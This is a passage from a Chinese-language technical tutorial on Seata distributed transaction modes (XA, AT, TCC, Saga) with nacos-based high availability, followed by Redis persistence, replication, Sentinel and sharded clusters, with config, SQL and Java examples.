采用1.4.2版本-->\n    <version>${seata.version}</version>\n</dependency>\n```\n\n#### 2.配置TC地址\n\n在order-service中的application.yml中，配置TC服务信息，通过注册中心nacos，结合服务名称获取TC地址：\n\n```yaml\nseata:\n  registry: # TC服务注册中心的配置，微服务根据这些信息去注册中心获取tc服务地址\n    type: nacos # 注册中心类型 nacos\n    nacos:\n      server-addr: 127.0.0.1:8848 # nacos地址\n      namespace: \"\" # namespace，默认为空\n      group: DEFAULT_GROUP # 分组，默认是DEFAULT_GROUP\n      application: seata-tc-server # seata服务名称\n      username: nacos\n      password: nacos\n  tx-service-group: seata-demo # 事务组名称\n  service:\n    vgroup-mapping: # 事务组与cluster的映射关系\n      seata-demo: SH\n```\n\n## ➃Seata实践\n\n### ❶XA模式\n\nXA 规范 是 X/Open 组织定义的分布式事务处理（DTP，Distributed Transaction Processing）标准，XA 规范描述了全局的TM与局部的RM之间的接口，几乎所有主流的数据库都对 XA 规范提供了支持。\n\n#### 1.两阶段提交\n\nXA是规范，目前主流数据库都实现了这种规范，实现的原理都是基于两阶段提交。\n\n| 正常情况                                             | 异常情况                                             |\n| ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210161435238.png) | ![](https://img.jwt1399.top/img/202210161435283.png) |\n\n一阶段：\n\n- 事务协调者通知每个事物参与者执行本地事务\n- 本地事务执行完成后报告事务执行状态给事务协调者，此时事务不提交，继续持有DB锁\n\n二阶段：\n\n- 事务协调者基于一阶段的报告来判断下一步操作\n  - 如果一阶段都成功，则通知所有事务参与者，提交事务\n  - 如果一阶段任意一个参与者失败，则通知所有事务参与者回滚事务\n\n#### 2.Seata的XA模型\n\nSeata对原始的XA模式做了简单的封装和改造，以适应自己的事务模型，基本架构如图：\n\n![](https://img.jwt1399.top/img/202210161438000.png)\n\nRM一阶段的工作：\n\n- a.注册分支事务到TC\n\n- b.执行分支业务sql但不提交\n\n- c.报告执行状态到TC\n\nTC二阶段的工作：TC检测各分支事务执行状态\n\n- a.如果都成功，通知所有RM提交事务\n\n- b.如果有失败，通知所有RM回滚事务\n\nRM二阶段的工作：接收TC指令，提交或回滚事务\n\n#### 3.优缺点\n\nXA模式的优点是什么？\n\n- 事务的强一致性，满足ACID原则。\n- 常用数据库都支持，实现简单，并且没有代码侵入\n\nXA模式的缺点是什么？\n\n- 因为一阶段需要锁定数据库资源，等待二阶段结束才释放，性能较差\n- 依赖关系型数据库实现事务\n\n#### 4.实现XA模式\n\nSeata的starter已经完成了XA模式的自动装配，实现非常简单，步骤如下：\n\n1）修改application.yml文件（每个参与事务的微服务），开启XA模式：\n\n```yaml\nseata:\n  data-source-proxy-mode: XA\n```\n\n2）给发起全局事务的入口方法添加`@GlobalTransactional`注解:\n\n本例中是OrderServiceImpl中的create方法.\n\n![](https://img.jwt1399.top/img/202210161453759.png)\n\n3）重启服务并测试\n\n重启order-service，再次测试，发现无论怎样，三个微服务都能成功回滚。\n\n### ❷AT模式\n\nAT模式同样是分阶段提交的事务模型，不过缺弥补了XA模型中资源锁定周期过长的缺陷。\n\n#### 1.Seata的AT模型\n\n![基本流程图](https://img.jwt1399.top/img/202210161454450.png)\n\n阶段一RM的工作：\n\n- 注册分支事务\n- 记录undo-log（数据快照）\n- 执行业务sql并提交\n- 报告事务状态\n\n阶段二提交时RM的工作：删除undo-log即可\n\n阶段二回滚时RM的工作：根据undo-log恢复数据到更新前\n\n#### 2.流程梳理\n\n我们用一个真实的业务来梳理下AT模式的原理。比如，现在有一个数据库表，记录用户余额：\n\n| **id** | **money** |\n| ------ | --------- |\n| 1      | 100       |\n\n其中一个分支业务要执行的SQL为：\n\n```sql\nupdate tb_account set money = money - 10 where id = 1\n```\n\nAT模式下，当前分支事务执行流程如下：\n\n| 流程图                                                       | 阶段                                                         |\n| ------------------------------------------------------------ | ------------------------------------------------------------ |\n| ![](../images/SpringCloud-高级篇/image-20221016151005722.png) | 阶段一：<br/>1.TM发起并注册全局事务到TC<br/>2.TM调用分支事务<br/>3.分支事务准备执行业务SQL<br/>4.RM拦截业务SQL，根据where条件查询原始数据，形成快照。<br/>5.RM执行业务SQL，提交本地事务，释放数据库锁。此时 `money = 90`<br/>6.RM报告本地事务状态给TC<br/>阶段二：<br/>1.TM通知TC事务结束<br/>2.TC检查分支事务状态<br/>  a.如果都成功，则立即删除快照<br/>  b.如果有分支事务失败，需要回滚。读取快照数据（`{\"id\": 1, \"money\": 100}`），将快照恢复到数据库。此时数据库再次恢复为100 |\n\n#### 3.AT与XA的区别\n\n简述AT模式与XA模式最大的区别是什么？\n\n- XA模式一阶段不提交事务，锁定资源；AT模式一阶段直接提交，不锁定资源。\n- XA模式依赖数据库机制实现回滚；AT模式利用数据快照实现数据回滚。\n- XA模式强一致；AT模式最终一致\n\n#### 4.脏写问题\n\n在多线程并发访问AT模式的分布式事务时，有可能出现脏写问题，如图：\n\n![](https://img.jwt1399.top/img/202210161519740.png)\n\n解决思路是引入全局锁概念。在释放DB锁之前，先拿到全局锁。避免同一时刻有另外一个事务来操作当前数据。\n\n![](https://img.jwt1399.top/img/202210161520005.png)\n\n#### 5.优缺点\n\nAT模式的优点：\n\n- 一阶段完成直接提交事务，释放数据库资源，性能比较好\n- 利用全局锁实现读写隔离\n- 没有代码侵入，框架自动完成回滚和提交\n\nAT模式的缺点：\n\n- 两阶段之间属于软状态，属于最终一致\n- 框架的快照功能会影响性能，但比XA模式要好很多\n\n#### 6.实现AT模式\n\nAT模式中的快照生成、回滚等动作都是由框架自动完成，没有任何代码侵入，因此实现非常简单。\n\n只不过，AT模式需要一个表来记录全局锁、另一张表来记录数据快照undo_log。\n\n1）导入数据库表，记录全局锁，即导入提供的Sql文件：seata-at.sql\n\n- lock_table导入到TC服务关联的数据库，\n\n- undo_log表导入到微服务关联的数据库\n\n2）修改application.yml文件，将事务模式修改为AT模式即可：\n\n```yaml\nseata:\n  data-source-proxy-mode: AT # 默认就是AT\n```\n\n3）重启服务并测试\n\n### ❸TCC模式\n\nTCC模式与AT模式很相似，每阶段都是独立事务，不同的是TCC通过人工编码实现数据恢复。需要实现三个方法：\n\n- Try：资源的检测和预留； \n\n- Confirm：完成资源操作业务；要求 Try 成功 Confirm 一定要能成功。\n\n- Cancel：预留资源释放，可以理解为try的反向操作。\n\n#### 1.Seata的TCC模型\n\nSeata中的TCC模型依然延续之前的事务架构，如图：\n\n![](https://img.jwt1399.top/img/202210171355418.png)\n\n#### 2.流程分析\n\n> 举例，一个扣减用户余额的业务。假设账户A原来余额是100，需要余额扣减30元。\n\n初始余额：\n\n![](https://img.jwt1399.top/img/202210171401157.png)\n\n- **阶段一（ Try ）**：检查余额是否充足，如果充足则冻结金额增加30元，可用余额扣除30\n\n![](https://img.jwt1399.top/img/202210171401269.png)\n\n此时，总金额 = 冻结金额 + 可用金额，数量依然是100不变。事务直接提交无需等待其它事务。\n\n- **阶段二（Confirm)**：假如要提交（Confirm），则冻结金额扣减30\n\n![](https://img.jwt1399.top/img/202210171401837.png)\n\n此时，总金额 = 冻结金额 + 可用金额 = 0 + 70  = 70元\n\n- **阶段二（Canncel）**：如果要回滚（Cancel），则冻结金额扣减30，可用余额增加30\n\n![](https://img.jwt1399.top/img/202210171401319.png)\n\n#### 3.优缺点\n\nTCC模式的每个阶段是做什么的？\n\n- Try：资源检查和预留\n- Confirm：业务执行和提交\n- Cancel：预留资源的释放\n\nTCC的优点是什么？\n\n- 一阶段完成直接提交事务，释放数据库资源，性能好\n- 相比AT模型，无需生成快照，无需使用全局锁，性能最强\n- 不依赖数据库事务，而是依赖补偿操作，可以用于非事务型数据库\n\nTCC的缺点是什么？\n\n- 有代码侵入，需要人为编写try、Confirm和Cancel接口，太麻烦\n- 软状态，事务是最终一致\n- 需要考虑Confirm和Cancel的失败情况，做好幂等处理\n\n#### 4.事务悬挂和空回滚\n\n##### 1）空回滚\n\n当某分支事务的try阶段**阻塞**时，可能导致全局事务超时而触发二阶段的cancel操作。在未执行try操作时先执行了cancel操作，这时cancel不能做回滚，就是**空回滚**。\n\n![](https://img.jwt1399.top/img/202210171406599.png)\n\n执行cancel操作时，应当判断try是否已经执行，如果尚未执行，则应该空回滚。\n\n##### 2）业务悬挂\n\n对于已经空回滚的业务，之前被阻塞的try操作恢复，继续执行try，就永远不可能confirm或cancel ，事务一直处于中间状态，这就是**业务悬挂**。\n\n执行try操作时，应当判断cancel是否已经执行过了，如果已经执行，应当阻止空回滚后的try操作，避免悬挂\n\n#### 5.实现TCC模式\n\n解决空回滚和业务悬挂问题，必须要记录当前事务状态，是在try、还是cancel？\n\n##### 1）思路分析\n\n定义一张表：\n\n```sql\nCREATE TABLE `account_freeze_tbl` (\n  `xid` varchar(128) NOT NULL,\n  `user_id` varchar(255) DEFAULT NULL COMMENT '用户id',\n  `freeze_money` int(11) unsigned DEFAULT '0' COMMENT '冻结金额',\n  `state` int(1) DEFAULT NULL COMMENT '事务状态，0:try，1:confirm，2:cancel',\n  PRIMARY KEY (`xid`) USING BTREE\n) ENGINE=InnoDB DEFAULT CHARSET=utf8 ROW_FORMAT=COMPACT;\n\n```\n\n其中：\n\n- xid：是全局事务id\n- freeze_money：用来记录用户冻结金额\n- state：用来记录事务状态\n\n那此时，我们的业务开怎么做呢？\n\n- Try业务：\n  - 记录冻结金额和事务状态到account_freeze表\n  - 扣减account表可用金额\n- Confirm业务\n  - 根据xid删除account_freeze表的冻结记录\n- Cancel业务\n  - 修改account_freeze表，冻结金额为0，state为2\n  - 修改account表，恢复可用金额\n- 如何判断是否空回滚？\n  - cancel业务中，根据xid查询account_freeze，如果为null则说明try还没做，需要空回滚\n- 如何避免业务悬挂？\n  - try业务中，根据xid查询account_freeze ，如果已经存在则证明Cancel已经执行，拒绝执行try业务\n\n接下来，我们改造account-service，利用TCC实现余额扣减功能。\n\n##### 2）声明TCC接口\n\nTCC的Try、Confirm、Cancel方法都需要在接口中基于注解来声明，\n\n我们在account-service项目中的`cn.itcast.account.service`包中新建一个接口，声明TCC三个接口：\n\n```java\n@LocalTCC\npublic interface AccountTCCService {\n\n    @TwoPhaseBusinessAction(name = \"deduct\", commitMethod = \"confirm\", rollbackMethod = \"cancel\")\n    void deduct(@BusinessActionContextParameter(paramName = \"userId\") String userId,\n                @BusinessActionContextParameter(paramName = \"money\")int money);\n\n    boolean confirm(BusinessActionContext ctx);\n\n    boolean cancel(BusinessActionContext ctx);\n}\n```\n\n#### 3）编写实现类\n\n在account-service服务中的`cn.itcast.account.service.impl`包下新建一个类，实现TCC业务：\n\n```java\n@Service\n@Slf4j\npublic class AccountTCCServiceImpl implements AccountTCCService {\n\n    @Autowired\n    private AccountMapper accountMapper;\n    @Autowired\n    private AccountFreezeMapper freezeMapper;\n\n    @Override\n    @Transactional\n    public void deduct(String userId, int money) {\n        // 0.获取事务id\n        String xid = RootContext.getXID();\n        // 1.扣减可用余额\n        accountMapper.deduct(userId, money);\n        // 2.记录冻结金额，事务状态\n        AccountFreeze freeze = new AccountFreeze();\n        freeze.setUserId(userId);\n        freeze.setFreezeMoney(money);\n        freeze.setState(AccountFreeze.State.TRY);\n        freeze.setXid(xid);\n        freezeMapper.insert(freeze);\n    }\n\n    @Override\n    public boolean confirm(BusinessActionContext ctx) {\n        // 1.获取事务id\n        String xid = ctx.getXid();\n        // 2.根据id删除冻结记录\n        int count = freezeMapper.deleteById(xid);\n        return count == 1;\n    }\n\n    @Override\n    public boolean cancel(BusinessActionContext ctx) {\n        // 0.查询冻结记录\n        String xid = ctx.getXid();\n        AccountFreeze freeze = freezeMapper.selectById(xid);\n\n        // 1.恢复可用余额\n        accountMapper.refund(freeze.getUserId(), freeze.getFreezeMoney());\n        // 2.将冻结金额清零，状态改为CANCEL\n        freeze.setFreezeMoney(0);\n        freeze.setState(AccountFreeze.State.CANCEL);\n        int count = freezeMapper.updateById(freeze);\n        return count == 1;\n    }\n}\n```\n\n### ❹SAGA模式\n\nSaga 模式是 Seata 即将开源的长事务解决方案，将由蚂蚁金服主要贡献。其理论基础是Hector & Kenneth  在1987年发表的论文[Sagas](https://microservices.io/patterns/data/saga.html)。\n\nSeata官网对于Saga的指南：https://seata.io/zh-cn/docs/user/saga.html\n\n#### 1.原理\n\n在 Saga 模式下，分布式事务内有多个参与者，每一个参与者都是一个冲正补偿服务，需要用户根据业务场景实现其正向操作和逆向回滚操作。\n\n分布式事务执行过程中，依次执行各参与者的正向操作，如果所有正向操作均执行成功，那么分布式事务提交。如果任何一个正向操作执行失败，那么分布式事务会去退回去执行前面各参与者的逆向回滚操作，回滚已提交的参与者，使分布式事务回到初始状态。\n\n![](../images/SpringCloud-高级篇/image-20210724184846396.png)\n\nSaga也分为两个阶段：\n\n- 一阶段：直接提交本地事务\n- 二阶段：成功则什么都不做；失败则通过编写补偿业务来回滚\n\n\n\n#### 2.优缺点\n\n优点：\n\n- 事务参与者可以基于事件驱动实现异步调用，吞吐高\n- 一阶段直接提交事务，无锁，性能好\n- 不用编写TCC中的三个阶段，实现简单\n\n缺点：\n\n- 软状态持续时间不确定，时效性差\n- 没有锁，没有事务隔离，会有脏写\n\n### ❺四种模式对比\n\n我们从以下几个方面来对比四种实现：\n\n- 一致性：能否保证事务的一致性？强一致还是最终一致？\n- 隔离性：事务之间的隔离性如何？\n- 代码侵入：是否需要对业务代码改造？\n- 性能：有无性能损耗？\n- 场景：常见的业务场景\n\n![](https://img.jwt1399.top/img/202210161540817.png)\n\n## ➄高可用\n\n### ❶高可用架构模型\n\n搭建TC服务集群非常简单，启动多个TC服务，注册到nacos即可。但集群并不能确保100%安全，万一集群所在机房故障怎么办？所以如果要求较高，一般都会做异地多机房容灾。比如一个TC集群在上海，另一个TC集群在杭州：\n\n![image-20221017141942983](../images/SpringCloud-高级篇/image-20221017141942983.png)\n\n\n\n微服务基于事务组（tx-service-group)与TC集群的映射关系，来查找当前应该使用哪个TC集群。当SH集群故障时，只需要将vgroup-mapping中的映射关系改成HZ。则所有微服务就会切换到HZ的TC集群了。\n\n### ❷TC服务的高可用和异地容灾\n\n#### 1.模拟异地容灾的TC集群\n\n计划启动两台seata的tc服务节点：\n\n| 节点名称 | ip地址    | 端口号 | 集群名称 |\n| -------- | --------- | ------ | -------- |\n| seata    | 127.0.0.1 | 8091   | SH       |\n| seata2   | 127.0.0.1 | 8092   | HZ       |\n\n之前我们已经启动了一台seata服务，端口是8091，集群名为SH。现在，将seata目录复制一份，起名为seata2\n\n修改seata2/conf/registry.conf内容如下：\n\n```nginx\nregistry {\n  # tc服务的注册中心类，这里选择nacos，也可以是eureka、zookeeper等\n  type = \"nacos\"\n\n  nacos {\n    # seata tc 服务注册到 nacos的服务名称，可以自定义\n    application = \"seata-tc-server\"\n    serverAddr = \"127.0.0.1:8848\"\n    group = \"DEFAULT_GROUP\"\n    namespace = \"\"\n    cluster = \"HZ\"\n    username = \"nacos\"\n    password = \"nacos\"\n  }\n}\n\nconfig {\n  # 读取tc服务端的配置文件的方式，这里是从nacos配置中心读取，这样如果tc是集群，可以共享配置\n  type = \"nacos\"\n  # 配置nacos地址等信息\n  nacos {\n    serverAddr = \"127.0.0.1:8848\"\n    namespace = \"\"\n    group = \"SEATA_GROUP\"\n    username = \"nacos\"\n    password = \"nacos\"\n    dataId = \"seataServer.properties\"\n  }\n}\n```\n\n进入seata2/bin目录，然后运行命令：\n\n```powershell\nseata-server.sh -p 8092\n```\n\n打开nacos控制台，查看服务列表：\n\n![](../images/SpringCloud-高级篇/image-20210624151150840.png)\n\n点进详情查看：\n\n![](../images/SpringCloud-高级篇/image-20210624151221747.png)\n\n#### 2.将事务组映射配置到nacos\n\n接下来，我们需要将tx-service-group与cluster的映射关系都配置到nacos配置中心。\n\n新建一个配置：\n\n![](../images/SpringCloud-高级篇/image-20210624151507072.png)\n\n配置的内容如下：\n\n```properties\n# 事务组映射关系\nservice.vgroupMapping.seata-demo=SH\n\nservice.enableDegrade=false\nservice.disableGlobalTransaction=false\n# 与TC服务的通信配置\ntransport.type=TCP\ntransport.server=NIO\ntransport.heartbeat=true\ntransport.enableClientBatchSendRequest=false\ntransport.threadFactory.bossThreadPrefix=NettyBoss\ntransport.threadFactory.workerThreadPrefix=NettyServerNIOWorker\ntransport.threadFactory.serverExecutorThreadPrefix=NettyServerBizHandler\ntransport.threadFactory.shareBossWorker=false\ntransport.threadFactory.clientSelectorThreadPrefix=NettyClientSelector\ntransport.threadFactory.clientSelectorThreadSize=1\ntransport.threadFactory.clientWorkerThreadPrefix=NettyClientWorkerThread\ntransport.threadFactory.bossThreadSize=1\ntransport.threadFactory.workerThreadSize=default\ntransport.shutdown.wait=3\n# RM配置\nclient.rm.asyncCommitBufferLimit=10000\nclient.rm.lock.retryInterval=10\nclient.rm.lock.retryTimes=30\nclient.rm.lock.retryPolicyBranchRollbackOnConflict=true\nclient.rm.reportRetryCount=5\nclient.rm.tableMetaCheckEnable=false\nclient.rm.tableMetaCheckerInterval=60000\nclient.rm.sqlParserType=druid\nclient.rm.reportSuccessEnable=false\nclient.rm.sagaBranchRegisterEnable=false\n# TM配置\nclient.tm.commitRetryCount=5\nclient.tm.rollbackRetryCount=5\nclient.tm.defaultGlobalTransactionTimeout=60000\nclient.tm.degradeCheck=false\nclient.tm.degradeCheckAllowTimes=10\nclient.tm.degradeCheckPeriod=2000\n\n# undo日志配置\nclient.undo.dataValidation=true\nclient.undo.logSerialization=jackson\nclient.undo.onlyCareUpdateColumns=true\nclient.undo.logTable=undo_log\nclient.undo.compress.enable=true\nclient.undo.compress.type=zip\nclient.undo.compress.threshold=64k\nclient.log.exceptionRate=100\n```\n\n#### 3.微服务读取nacos配置\n\n接下来，需要修改每一个微服务的application.yml文件，让微服务读取nacos中的client.properties文件：\n\n```yaml\nseata:\n  config:\n    type: nacos\n    nacos:\n      server-addr: 127.0.0.1:8848\n      username: nacos\n      password: nacos\n      group: SEATA_GROUP\n      data-id: client.properties\n```\n\n重启微服务，现在微服务到底是连接tc的SH集群，还是tc的HZ集群，都统一由nacos的client.properties来决定了。\n\n# 3.分布式缓存\n\n## ①Redis持久化\n\n### ❶RDB持久化\n\nRDB全称Redis Database Backup file（Redis数据备份文件），也被叫做Redis数据快照。简单来说就是把内存中的所有数据都记录到磁盘中。当Redis实例故障重启后，从磁盘读取快照文件，恢复数据。快照文件称为RDB文件，默认是保存在当前运行目录。\n\n#### 1.执行时机\n\nRDB持久化在四种情况下会执行：\n\n- 执行save命令\n- 执行bgsave命令\n- Redis停机时\n- 触发RDB条件时\n\n**1）save命令**\n\n执行下面的命令，可以立即执行一次RDB：\n\n![](https://img.jwt1399.top/img/202210171526801.png)\n\nsave命令会导致**主进程**执行RDB，这个过程中其它所有命令都会被阻塞。只有在数据迁移时可能用到。\n\n**2）bgsave命令**\n\n下面的命令可以异步执行RDB：\n\n![](https://img.jwt1399.top/img/202210171527946.png)\n\n这个命令执行后会开启**子进程**完成RDB，主进程可以持续处理用户请求，不受影响。\n\n**3）停机时**\n\nRedis停机时会执行一次save命令，实现RDB持久化。\n\n**4）触发RDB条件**\n\nRedis内部有触发RDB的机制，可以在redis.conf文件中找到，格式如下：\n\n```properties\n# 900秒内，如果至少有1个key被修改，则执行bgsave ， 如果是save \"\" 则表示禁用RDB\nsave 900 1  \nsave 300 10  \nsave 60 10000 \n```\n\nRDB的其它配置也可以在redis.conf文件中设置：\n\n```properties\n# 是否压缩 ,建议不开启，压缩也会消耗cpu，磁盘的话不值钱\nrdbcompression yes\n\n# RDB文件名称\ndbfilename dump.rdb  \n\n# 文件保存的路径目录\ndir ./ \n```\n\n#### 2.RDB原理\n\nbgsave开始时会fork主进程得到子进程，子进程共享主进程的内存数据。完成fork后读取内存数据并写入 RDB 文件。fork采用的是copy-on-write技术：\n\n- 当主进程执行读操作时，访问共享内存；\n- 当主进程执行写操作时，则会拷贝一份数据，执行写操作。\n\n![](https://img.jwt1399.top/img/202210171530554.png)\n\n\n\n\n\n#### 3.小结\n\nRDB方式bgsave的基本流程？\n\n- fork主进程得到一个子进程，共享内存空间\n- 子进程读取内存数据并写入新的RDB文件\n- 用新RDB文件替换旧的RDB文件\n\nRDB会在什么时候执行？save 60 1000代表什么含义？\n\n- 默认是服务停止时\n- 代表60秒内至少执行1000次修改则触发RDB\n\nRDB的缺点？\n\n- RDB执行间隔时间长，两次RDB之间写入数据有丢失的风险\n- fork子进程、压缩、写出RDB文件都比较耗时\n\n### ❷AOF持久化\n\nAOF全称为Append Only File（追加文件）。Redis处理的每一个写命令都会记录在AOF文件，可以看做是命令日志文件。\n\n![](https://img.jwt1399.top/img/202210171534071.png)\n\n#### 1.AOF配置\n\nAOF默认是关闭的，需要修改redis.conf配置文件来开启AOF：\n\n```properties\n# 是否开启AOF功能，默认是no\nappendonly yes\n# AOF文件的名称\nappendfilename \"appendonly.aof\"\n```\n\nAOF的命令记录的频率也可以通过redis.conf文件来配：\n\n```properties\n# 表示每执行一次写命令，立即记录到AOF文件\nappendfsync always \n# 写命令执行完先放入AOF缓冲区，然后表示每隔1秒将缓冲区数据写到AOF文件，是默认方案\nappendfsync everysec \n# 写命令执行完先放入AOF缓冲区，由操作系统决定何时将缓冲区内容写回磁盘\nappendfsync no\n```\n\n三种策略对比：\n\n![](https://img.jwt1399.top/img/202210171535268.png)\n\n#### 2.AOF文件重写\n\n因为是记录命令，AOF文件会比RDB文件大的多。而且AOF会记录对同一个key的多次写操作，但只有最后一次写操作才有意义。通过执行bgrewriteaof命令，可以让AOF文件执行重写功能，用最少的命令达到相同效果。\n\n![](https://img.jwt1399.top/img/202210171537365.png)\n\n如图，AOF原本有三个命令，但是`set num 123 和 set num 666`都是对num的操作，第二次会覆盖第一次的值，因此第一个命令记录下来没有意义。所以重写命令后，AOF文件内容就是：`mset name jack num 666`\n\nRedis也会在触发阈值时自动去重写AOF文件。阈值也可以在redis.conf中配置：\n\n```properties\n# AOF文件比上次文件 增长超过多少百分比则触发重写\nauto-aof-rewrite-percentage 100\n# AOF文件体积最小多大以上才触发重写 \nauto-aof-rewrite-min-size 64mb \n```\n\n### ❸RDB与AOF对比\n\nRDB和AOF各有自己的优缺点，如果对数据安全性要求较高，在实际开发中往往会**结合**两者来使用。\n\n![](https://img.jwt1399.top/img/202210171540950.png)\n\n## ②Redis主从\n\n### ❶主从同步原理\n\n#### 1.全量同步\n\n主从第一次建立连接时，会执行**全量同步**，将master节点的所有数据都拷贝给slave节点，流程：\n\n![](https://img.jwt1399.top/img/202210242159182.png)\n\nmaster如何得知salve是第一次来连接呢？？\n\n有几个概念，可以作为判断依据：\n\n- **Replication Id**：简称replid，是数据集的标记，id一致则说明是同一数据集。每一个master都有唯一的replid，slave则会继承master节点的replid\n- **offset**：偏移量，随着记录在repl_baklog中的数据增多而逐渐增大。slave完成同步时也会记录当前同步的offset。如果slave的offset小于master的offset，说明slave数据落后于master，需要更新。\n\n因此slave做数据同步，必须向master声明自己的replication id 和offset，master才可以判断到底需要同步哪些数据。因为slave原本也是一个master，有自己的replid和offset，当第一次变成slave，与master建立连接时，发送的replid和offset是自己的replid和offset。\n\nmaster判断发现slave发送来的replid与自己的不一致，说明这是一个全新的slave，就知道要做全量同步了。\n\nmaster会将自己的replid和offset都发送给这个slave，slave保存这些信息。以后slave的replid就与master一致了。\n\n因此，**master判断一个节点是否是第一次同步的依据，就是看replid是否一致**。流程：\n\n![](https://img.jwt1399.top/img/202210242159471.png)\n\n#### 2.增量同步\n\n全量同步需要先做RDB，然后将RDB文件通过网络传输个slave，成本太高了。因此除了第一次做全量同步，其它大多数时候slave与master都是做**增量同步**。增量同步就是只更新slave与master存在差异的部分数据。流程：\n\n![](https://img.jwt1399.top/img/202210242206846.png)\n\n那么master怎么知道slave与自己的数据差异在哪里呢?\n\n#### 3.repl_backlog原理\n\n> master怎么知道slave与自己的数据差异在哪里呢？这就要说到全量同步时的repl_baklog文件了。\n\n这个文件是一个固定大小的**环形数组**，也就是说**角标到达数组末尾后，会再次从0开始读写**，这样数组头部的数据就会被覆盖。repl_baklog中会记录Redis处理过的命令日志及offset，包括master当前的offset，和slave已经拷贝到的offset。\n\n➀slave与master的offset之间的差异，就是salve需要增量拷贝的数据了(即图中红色部分)。\n\n➁随着不断有数据写入，master的offset逐渐变大，slave也不断的拷贝，追赶master的offset\n\n➂直到数组被填满，此时，如果有新的数据写入，就会覆盖数组中的旧数据。不过，旧的数据只要是绿色的，说明是已经被同步到slave的数据，即便被覆盖了也没什么影响。因为未同步的是红色部分。\n\n➃但是，如果slave出现网络阻塞，导致master的offset远远超过了slave的offset，如果master继续写入新数据，其offset就会覆盖旧的数据，直到将slave现在的offset也覆盖\n\n➄棕色框中的红色部分，就是尚未同步，但是却已经被覆盖的数据。此时如果slave恢复，需要同步，却发现自己的offset都没有了，无法完成增量同步了。只能做全量同步。\n\n| ➀                                                    | ➁                                                    | ➂                                                    | ➃                                                    | ➄                                                    |\n| ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- | ---------------------------------------------------- |\n| ![](https://img.jwt1399.top/img/202210242220885.png) | ![](https://img.jwt1399.top/img/202210242220139.png) | ![](https://img.jwt1399.top/img/202210242220579.png) | ![](https://img.jwt1399.top/img/202210242220746.png) | ![](https://img.jwt1399.top/img/202210242220273.png) |\n\n总结：repl_baklog大小有上限，写满后会覆盖最早的数据。如果slave断开时间过久，导致尚未备份的数据被覆盖，则无法基于1og做增量同步，只能再次全量同步。\n\n### ❷主从同步优化\n\n主从同步可以保证主从数据的一致性，可以从以下几个方面来优化Redis主从集群：\n\n- 在master中配置`repl-diskless-sync yes`启用无磁盘复制，避免全量同步时的磁盘IO。\n- Redis单节点上的内存占用不要太大，减少RDB导致的过多磁盘IO\n- 适当提高repl_baklog的大小，发现slave宕机时尽快实现故障恢复，尽可能避免全量同步\n- 限制一个master上的slave节点数量，如果实在是太多slave，则可以采用主-从-从链式结构，减少master压力\n\n主从从架构图：\n\n![](https://img.jwt1399.top/img/202210242223210.png)\n\n### ❸总结\n\n简述全量同步和增量同步区别？\n\n- 全量同步：master将完整内存数据生成RDB，发送RDB到slave。后续命令则记录在repl_baklog，逐个发送给slave。\n- 增量同步：slave提交自己的offset到master，master获取repl_baklog中从offset之后的命令给slave\n\n什么时候执行全量同步？\n\n- slave节点第一次连接master节点时\n- slave节点断开时间太久，repl_baklog中的offset已经被覆盖时\n\n什么时候执行增量同步？\n\n- slave节点断开又恢复，并且在repl_baklog中能找到offset时\n\n## ③Redis哨兵\n\n### ❶哨兵结构和作用\n\nRedis提供了哨兵（Sentinel）机制来实现主从集群的自动故障恢复。\n\n![哨兵的结构](https://img.jwt1399.top/img/202210242243769.png)\n\n哨兵的作用如下：\n\n- **监控**：Sentinel会不断检查您的master和slave是否按预期工作\n- **自动故障恢复**：如果master故障，Sentinel会将一个slave提升为master。故障实例恢复后也以新的master为主\n- **通知**：Sentinel充当Redis客户端的服务发现来源，当集群发生故障转移时，将最新信息推送给Redis的客户端\n\n### ❷集群监控原理\n\nSentinel基于心跳机制监测服务状态，每隔1秒向集群的每个实例发送ping命令：\n\n- 主观下线：如果某sentinel节点发现某实例未在规定时间响应，则认为该实例**主观下线**。\n\n- 客观下线：若超过指定数量（quorum）的sentinel都认为该实例主观下线，则该实例**客观下线**。quorum值最好超过Sentinel实例数量的一半。\n\n### ❸集群故障恢复原理\n\n一旦发现master故障，sentinel需要在salve中选择一个作为新的master，选择依据是这样的：\n\n- 首先会判断slave节点与master节点断开时间长短，如果超过指定值（down-after-milliseconds * 10）则会排除该slave节点\n- 然后判断slave节点的slave-priority值，越小优先级越高，如果是0则永不参与选举\n- 如果slave-prority一样，则判断slave节点的offset值，越大说明数据越新，优先级越高\n- 最后是判断slave节点的运行id大小，越小优先级越高。\n\n当选出一个新的master后，该如何实现切换呢？流程如下：\n\n- sentinel给备选的slave节点发送`slaveof no one`命令，让该节点成为master\n- sentinel给所有其它slave发送`slaveof 192.168.150.101 7002`命令（备选slave的地址和端口） ，让这些slave成为新master的从节点，开始从新的master上同步数据。\n- 最后，sentinel将故障节点标记为slave，当故障节点恢复后会自动成为新的master的slave节点\n\n![](https://img.jwt1399.top/img/202210242247262.png)\n\n### ❹总结\n\nSentinel的三个作用是什么？\n\n- 监控\n- 故障转移\n- 通知\n\nSentinel如何判断一个redis实例是否健康？\n\n- 每隔1秒发送一次ping命令，如果超过一定时间没有响应则认为是主观下线\n- 如果大多数sentinel都认为实例主观下线，则判定服务下线\n\n故障转移步骤有哪些？\n\n- 首先选定一个slave作为新的master，执行slaveof no one\n- 然后让所有节点都执行slaveof 新master\n- 修改故障节点配置，添加slaveof 新master\n\n## ④Redis分片集群\n\n### ❶分片集群结构\n\n主从和哨兵可以解决高可用、高并发读的问题。但是依然有两个问题没有解决：\n\n- 海量数据存储问题\n\n- 高并发写的问题\n\n使用分片集群可以解决上述问题，如图:\n\n<img src=\"https://img.jwt1399.top/img/202210242253041.png\" style=\"zoom:50%;\" />\n\n\n\n分片集群特征：\n\n- 集群中有多个master，每个master保存不同数据\n\n- 每个master都可以有多个slave节点\n\n- master之间通过ping监测彼此健康状态\n\n- 客户端请求可以访问集群任意节点，最终都会被转发到正确节点\n\n### ❷散列插槽\n\nRedis会把每一个master节点映射到0~16383共16384个插槽（hash slot）上，查看集群信息时(`cluster nodes`)就能看到：\n\n![](https://img.jwt1399.top/img/202210242259764.png)\n\n数据key不是与节点绑定，而是与插槽绑定。redis会根据key的有效部分计算插槽值，分两种情况：\n\n- key中包含\"{}\"，且“{}”中至少包含1个字符，“{}”中的部分是有效部分\n- 